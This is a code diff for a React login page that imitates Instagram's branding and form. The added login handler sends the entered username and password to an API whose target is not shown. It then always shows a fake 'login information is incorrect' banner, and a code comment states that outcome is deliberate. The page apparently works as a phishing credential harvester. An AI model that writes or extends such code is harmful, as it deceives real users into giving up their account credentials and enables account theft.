@@ -1,5 +1,6 @@
 import { useState } from 'react'
 import './App.css'
+import { loginApi } from './api'
 
 import instagramLogo from '../assets/instagramLogoDarkWithoutBack.png'
 import leftImage from '../assets/left.png'
@@ -7,10 +8,22 @@ import leftImage from '../assets/left.png'
 function App() {
   const [username, setUsername] = useState('')
   const [password, setPassword] = useState('')
+  const [loading, setLoading] = useState(false)
+  const [showError, setShowError] = useState(false)
 
-  const handleLogin = (e: React.FormEvent) => {
+  const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault()
-    // handle login
+    if (!username || !password) return
+    setLoading(true)
+    setShowError(false)
+    try {
+      await loginApi(username, password)
+    } catch {
+      // swallow — always show the wrong-credentials banner
+    } finally {
+      setLoading(false)
+      setShowError(true)
+    }
   }
 
   return (
@@ -38,6 +51,22 @@ function App() {
               <h2 className="ig-login-title">Log into Instagram</h2>
             </div>
 
+            {showError && (
+              <div className="ig-error-banner" role="alert">
+                <span className="ig-error-icon" aria-hidden="true">
+                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="12" cy="12" r="11" stroke="#e87d35" strokeWidth="2" />
+                    <path d="M12 7v5" stroke="#e87d35" strokeWidth="2" strokeLinecap="round" />
+                    <circle cx="12" cy="16.5" r="1" fill="#e87d35" />
+                  </svg>
+                </span>
+                <p className="ig-error-text">
+                  The login information you entered is incorrect.{' '}
+                  <a href="#" className="ig-error-link">Find your account and log in.</a>
+                </p>
+              </div>
+            )}
+
             <form className="ig-form" onSubmit={handleLogin}>
               <input
                 className="ig-input"
@@ -55,8 +84,8 @@ function App() {
                 onChange={(e) => setPassword(e.target.value)}
                 autoComplete="current-password"
               />
-              <button className="ig-btn-login" type="submit">
-                Log in
+              <button className="ig-btn-login" type="submit" disabled={loading}>
+                {loading ? 'Logging in…' : 'Log in'}
               </button>
             </form>
 
